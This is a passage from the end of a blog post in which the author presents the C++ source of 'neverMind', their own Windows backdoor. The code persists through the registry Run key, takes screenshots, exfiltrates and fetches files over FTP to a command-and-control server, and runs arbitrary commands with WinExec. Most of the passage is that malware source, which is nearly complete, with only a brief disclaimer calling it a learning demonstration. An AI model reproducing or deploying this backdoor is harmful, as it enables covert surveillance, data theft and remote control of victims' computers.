</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>copy_file(new_path, dest);
</span></span><span style="display:flex;"><span>        system(std<span style="color:#ff79c6">::</span>string(<span style="color:#f1fa8c">&#34;reg add HKCU</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Software</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Microsoft</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Windows</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">CurrentVersion</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Run /v SysConnection /t REG_SZ /d </span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">+</span> dest <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">&#34;</span>).c_str());
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>compile(const std::string &amp;file_path)</code>: this function compiles + executes commands from a file. it reads the file, splits each line into commands, and executes them.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>compile(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>file_path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string code <span style="color:#ff79c6">=</span> wrapper<span style="color:#ff79c6">::</span>read_file(file_path);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>stringstream ss_code(code);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string line;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> (std<span style="color:#ff79c6">::</span>getline(ss_code, line))
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>                std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&gt;</span> spl_line;
</span></span><span style="display:flex;"><span>                std<span style="color:#ff79c6">::</span>stringstream ss_line(line);
</span></span><span style="display:flex;"><span>                std<span style="color:#ff79c6">::</span>string command;
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">while</span> (std<span style="color:#ff79c6">::</span>getline(ss_line, command, <span style="color:#f1fa8c">&#39; &#39;</span>)) {
</span></span><span style="display:flex;"><span>                    spl_line.push_back(command);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                execute(spl_line);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">catch</span> (...) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">continue</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>execute(const std::vector&lt;std::string&gt;&amp; spl_line)</code>: this function executes the provided commands. it supports several commands like <code>print</code>, <code>screen</code>, <code>upload</code>, <code>download</code>, <code>exec</code>. each command performs a specific operation and writes the result to the output file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>execute(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&gt;&amp;</span> spl_line)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>string main_cmd <span style="color:#ff79c6">=</span> spl_line[<span style="color:#bd93f9">0</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;print&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[&gt;] &#34;</span> <span style="color:#ff79c6">+</span> spl_line[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34; [&lt;]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;screen&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd">int</span> counter <span style="color:#ff79c6">=</span> std<span style="color:#ff79c6">::</span>stoi(spl_line[<span style="color:#bd93f9">1</span>]);
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>ftp_connection.cd(<span style="color:#f1fa8c">&#34;screens&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    ftp_connection.mkdir(<span style="color:#f1fa8c">&#34;screens&#34;</span>);
</span></span><span style="display:flex;"><span>                    ftp_connection.cd(<span style="color:#f1fa8c">&#34;screens&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> counter; <span style="color:#ff79c6">++</span>i)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    std<span style="color:#ff79c6">::</span>string screenshot_path <span style="color:#ff79c6">=</span> wrapper<span style="color:#ff79c6">::</span>screenshot(data_path);
</span></span><span style="display:flex;"><span>                    Sleep(<span style="color:#bd93f9">500</span>);
</span></span><span style="display:flex;"><span>                    ftp_connection.upload_file(screenshot_path, std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(screenshot_path).filename().u8string());
</span></span><span style="display:flex;"><span>                    Sleep(<span style="color:#bd93f9">1000</span>);
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[++] screenshots saved &gt;&gt; &#34;</span> <span style="color:#ff79c6">+</span> screenshot_path <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34; [++]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                ftp_connection.cd(<span style="color:#f1fa8c">&#34;../&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;upload&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">3</span>) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>ftp_connection.cd(<span style="color:#f1fa8c">&#34;uploads&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] folder not found [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (ftp_connection.retr_file(spl_line[<span style="color:#bd93f9">2</span>], spl_line[<span style="color:#bd93f9">1</span>]))
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[++] file upload successful [++]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!!] upload error [!!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                ftp_connection.cd(<span style="color:#f1fa8c">&#34;../&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;download&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>ftp_connection.cd(<span style="color:#f1fa8c">&#34;downloads&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    ftp_connection.mkdir(<span style="color:#f1fa8c">&#34;downloads&#34;</span>);
</span></span><span style="display:flex;"><span>                    ftp_connection.cd(<span style="color:#f1fa8c">&#34;downloads&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (ftp_connection.upload_file(spl_line[<span style="color:#bd93f9">1</span>], std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(spl_line[<span style="color:#bd93f9">1</span>]).filename().u8string()))
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[++] file download successful [++]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!!] downloading error [!!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                ftp_connection.cd(<span style="color:#f1fa8c">&#34;../&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;exec&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                WinExec(std<span style="color:#ff79c6">::</span>string(<span style="color:#f1fa8c">&#34;cmd </span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">d:&#34;</span> <span style="color:#ff79c6">+</span> spl_line[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;f</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">&#34;</span>).c_str(), <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>                wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!!] command: &#34;</span> <span style="color:#ff79c6">+</span> main_cmd <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;not found [!!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">catch</span> (...)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!!] error [!!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="main">main</h3>
<p>the <code>main.cpp</code> file creates an instance <code>M</code> of the <code>neverMind</code> class and starts the backdoor. it&rsquo;s the entry point of the application, and it contains the <code>wWinMain</code> function, which is the entry point in a Windows application linked with the <code>UNICODE</code> character set. the <code>host</code>, <code>username</code>, and <code>password</code> are the credentials of the FTP server. the <code>neverMind</code> object <code>M</code> is created and the backdoor is started by calling <code>M.start()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> WINAPI <span style="color:#50fa7b">wWinMain</span>(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, <span style="color:#8be9fd">int</span> CmdShow)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string host <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;host&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string username <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;username&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string password <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;password&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    neverMind M(host, username, password);
</span></span><span style="display:flex;"><span>    M.start();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>HINSTANCE hInstance</code>: a handle to the current instance of the application.</p>
<p><code>HINSTANCE hPrevInstance</code>: a handle to the previous instance of the application. this parameter is always NULL in modern Windows applications.</p>
<p><code>PWSTR szCmdLine</code>: a pointer to a null-terminated string specifying the command line for the application, excluding the program name.</p>
<p><code>int CmdShow</code>: controls how the window is to be shown. this parameter can be one of the following values: <code>SW_HIDE</code>, <code>SW_MAXIMIZE</code>, <code>SW_MINIMIZE</code>, <code>SW_RESTORE</code>, <code>SW_SHOW</code>, <code>SW_SHOWDEFAULT</code>, <code>SW_SHOWMAXIMIZED</code>, <code>SW_SHOWMINIMIZED</code>, <code>SW_SHOWMINNOACTIVE</code>, <code>SW_SHOWNA</code>, <code>SW_SHOWNOACTIVATE</code>, <code>SW_SHOWNORMAL</code>.</p>
<h2 id="conclusion">conclusion</h2>
<p><code>neverMind</code> is a demonstration (ahem) of a backdoor application that uses FTP for C2 (command + control) operations. it&rsquo;s written in C++ and uses the Windows API and WinINet API for network operations. the program has 3 main components: the <code>ftpC</code> class, the <code>neverMind</code> class, and the <code>main.cpp</code> file.</p>
<p><code>ftpC</code> provides a set of functions for FTP operations, including connecting to an FTP server, uploading/downloading files, and creating/switching directories. it uses the WinINet API, which is a high-level API for working with FTP, HTTP, and Gopher protocols.</p>
<p><code>neverMind</code> uses the <code>ftpC</code> class to connect to the FTP server and perform file operations. it contains methods for setting up and starting the backdoor, compiling + executing commands from a file, and adding the backdoor to the Windows Registry for persistence.</p>
<p><code>main.cpp</code> is the entry point of the app. it creates an instance of the <code>neverMind</code> class with the FTP server credentials and starts the backdoor.</p>
<p>i wrote this program to better learn and understand how backdoors work and how they can use FTP for C2 operations. as a result, i learned how to use the Windows and WinINet APIs, how to work with the Windows Registry for persistence, and how to execute system commands and capture their output.</p>
<p>it&rsquo;s important to note that this program is a demonstration of malware. it should not be used illegally. understanding how such software works can help in developing security measures + tools to detect and remove such threats. it can also be used to learn more about system internals and network programming.</p>
<p>happy hacking!</p>
</main>



<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/go-pro/" style="float: right"
      >next: goPro: detecting process hollowing with Go</a
    >
     
    <a class="previous" href="/posts/cookiejar/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>